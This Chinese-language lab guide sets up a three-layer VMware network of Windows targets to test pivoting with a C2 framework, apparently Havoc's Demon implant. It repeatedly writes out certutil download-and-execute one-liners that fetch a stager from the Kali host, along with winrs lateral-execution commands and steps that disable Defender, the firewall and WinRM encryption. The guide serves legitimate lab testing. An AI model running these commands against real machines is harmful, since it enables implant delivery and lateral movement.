# Windows 环境的三层跳板测试

Linux netns 实验网只能在本机内核里模拟；Windows 目标必须运行在 **Windows 宿主机的
VMware** 里（Kali 是 VMware guest，没有嵌套虚拟化）。下面按投入从小到大分三级，
先跑通一级再上三层。

> 只使用 VMware 的 host-only / NAT 实验网段，**不要**把 `192.168.1.0/24`
> 或公司网段接进实验；实验前在 Windows VM 内关闭 Defender/火绒或加白，
> 避免 `swt`/Demon 被拦截。

## 级别 0：同一台 Windows 主机自投递（5 分钟，验证 `swt`）

已有 Windows 会话 `2c67a896`（`192.168.121.1`，Administrator）直接对自己投递：

```text
shell certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
```

预期：几秒后出现一个新的 Windows 会话（同 `192.168.121.1`，进程名 `demonx64*.exe`），
`health=healthy`。验证完在新会话上执行 `exit process`，并删除
`C:\Users\Public\run.bat`（`swt` 通常已自删）。

这一步只证明 Windows 一键上线/回连正常，不涉及分段。

## 级别 1：一台 Win10 VM（NAT，单跳）

现成的 `D:\win10\Windows 10 x64.vmx`（16 GB 内存，NAT）可直接用：

1. 启动 VM，确认能 `ping 192.168.121.132`；不能的话在 VM 内关防火墙：
   ```bat
   netsh advfirewall set allprofiles state off
   ```
2. 在 VM 内手动执行（或从 Windows 宿主会话用 `vmrun`/WinRM 远程执行）：
   ```bat
   certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
   ```
3. 预期新会话 `external_ip=192.168.121.60`（VM 的 NAT 地址，按实际为准），
   `healthy`，可执行 `shell whoami`。

远程执行（VMware Tools 已装、知道 guest 账号时，从 Windows 宿主会话）：

```bat
"C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" -T ws ^
  -gu <guest用户> -gp <guest密码> runProgramInGuest ^
  "D:\win10\Windows 10 x64.vmx" -interactive ^
  "C:\Windows\System32\cmd.exe" "/c certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"
```

> 注：NAT 网段里 VM 直接回连 Kali `192.168.121.132:8080`，不需要改监听器/载荷；
> 现有 `LAN-Test` + `swt` 即可。

## 级别 2：三层 Windows 实验网（VMnet2/3/4）

### 2.1 网络规划

在 Windows 宿主的 VMware「虚拟网络编辑器」里新建（host-only，**不勾选** DHCP 和
“将主机虚拟适配器连接到此网络”，让宿主机不直接暴露在实验段）：

| VMnet | 网段 | 用途 |
| --- | --- | --- |
| VMnet2 | `10.10.10.0/24` | lab1 |
| VMnet3 | `10.10.20.0/24` | lab2 |
| VMnet4 | `10.10.30.0/24` | lab3 |

现有 `VMnet1 192.168.27.0/24`、`VMnet8 192.168.121.0/24` 保持不变。

### 2.2 节点

| 节点 | NIC1 | NIC2 | 说明 |
| --- | --- | --- | --- |
| R1（Linux 路由器） | VMnet8 `192.168.121.50/24` | VMnet2 `10.10.10.1/24` | 同时接 Kali 与 lab1 |
| R2（Linux 路由器） | VMnet2 `10.10.10.2/24` | VMnet3 `10.10.20.1/24` | lab1 ↔ lab2 |
| R3（Linux 路由器） | VMnet3 `10.10.20.2/24` | VMnet4 `10.10.30.1/24` | lab2 ↔ lab3 |
| W1（Win10 目标） | VMnet2 `10.10.10.10/24` gw `.1` | — | 第一层 |
| W2（Win10 目标） | VMnet3 `10.10.20.10/24` gw `.1` | — | 第二层 |
| W3（Win10 目标） | VMnet4 `10.10.30.10/24` gw `.1` | — | 第三层 |

路由器用 Ubuntu/Debian 最小系统即可（比 Windows Server RRAS 省事）：
`/etc/sysctl.d/99-router.conf` 写 `net.ipv4.ip_forward=1`，`sysctl --system`；
关闭 ufw 或放行转发。

R1：

```bash
ip addr add 192.168.121.50/24 dev <vmnet8网卡>
ip addr add 10.10.10.1/24 dev <vmnet2网卡>
ip route add 10.10.20.0/24 via 10.10.10.2
ip route add 10.10.30.0/24 via 10.10.10.2
```

R2：

```bash
ip addr add 10.10.10.2/24 dev <vmnet2网卡>
ip addr add 10.10.20.1/24 dev <vmnet3网卡>
ip route replace default via 10.10.10.1
ip route add 10.10.30.0/24 via 10.10.20.2
```

R3：

```bash
ip addr add 10.10.20.2/24 dev <vmnet3网卡>
ip addr add 10.10.30.1/24 dev <vmnet4网卡>
ip route replace default via 10.10.20.1
```

Kali 加回程路由（R1 是实验网到 Kali 的网关）：

```bash
sudo ip route add 10.10.0.0/16 via 192.168.121.50
```

Windows 宿主加路由（让 `2c67a896` 能直接访问 W1）：

```bat
route -p add 10.10.0.0 mask 255.255.0.0 192.168.121.50
```

### 2.3 Windows 目标准备

每台 W1/W2/W3：

```powershell
# 静态 IP（按层替换）
netsh interface ip set address name="Ethernet0" static 10.10.10.10 255.255.255.0 10.10.10.1
# 实验网内关闭防火墙
netsh advfirewall set allprofiles state off
# 开启 WinRM（从上一层会话远程投递）
Enable-PSRemoting -Force -SkipNetworkProfileCheck
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
```

在 Windows 宿主（或上一层 Windows 会话）配置 WinRM 客户端信任：

```bat
winrm set winrm/config/client @{TrustedHosts="*"}
```

### 2.4 逐层投递

```bat
:: 宿主会话 2c67a896 → W1
winrs -r:10.10.10.10 -u:.\<用户> -p:<密码> "cmd /c certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"

:: 新 W1 会话 → W2
winrs -r:10.10.20.10 -u:.\<用户> -p:<密码> "cmd /c certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"

:: 新 W2 会话 → W3
winrs -r:10.10.30.10 -u:.\<用户> -p:<密码> "cmd /c certutil -urlcache -split -f http://192.168.121.132:9901/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat"
```

预期三层会话：

| 层 | 目标 | 外部地址 | 状态 |
| --- | --- | --- | --- |
| 1 | W1 | `10.10.10.10` | healthy |
| 2 | W2 | `10.10.20.10` | healthy |
| 3 | W3 | `10.10.30.10` | healthy |

由于实验 VM 经 R1 直接路由到 Kali，现有 `LAN-Test`（`192.168.121.132:8080`）和
`payloads-out/demon.x64.exe` 可直接使用，不需要新建监听器或改 `swt`。

### 2.5 验证

```text
# 每层会话内
shell whoami & ipconfig | findstr IPv4 & route print -4 | findstr 10.10
# 跨层
shell ping -n 2 10.10.30.10     # W1 -> W3，TTL 应递减
```

会话表里三层分别显示 `10.10.10.10 / 10.10.20.10 / 10.10.30.10`；
C2 拓扑图仍是 TEAMSERVER 的直属节点（网络层跳板不产生 pivot 边）。

## 常见问题

| 现象 | 排查 |
| --- | --- |
| `swt` 404 | stager 是否在 9901、`payloads-out/demon.x64.exe` 是否存在 |
| 下载成功但无新会话 | VM 到 `192.168.121.132:8080` 不通；检查 R1 路由/Kali 回程路由/Windows 防火墙 |
| `winrs` 拒绝 | 目标未开 WinRM、未允许 Basic/Unencrypted、TrustedHosts 未加 |
| 三层 ping 不通 | 路由器 `ip_forward=1`、默认路由/回程路由、VMnet 是否 host-only |
| 内存不足 | Win10 每台 4–8 GB；3 台目标 + 3 台路由器建议宿主 ≥32 GB |

## 清理

```bat
:: 删除宿主实验路由
route delete 10.10.0.0 mask 255.255.0.0
:: 关闭实验 VM（VMware GUI 或）
"C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" stop "D:\path\to\vm.vmx" soft
```

```bash
# Kali 删除回程路由
sudo ip route del 10.10.0.0/16
```

实验结束后 Windows 目标上的 `run.bat` 通常已被 `swt` 自删；如需清理，
在会话里 `exit process` 并删除 `C:\Users\Public\run.bat`。
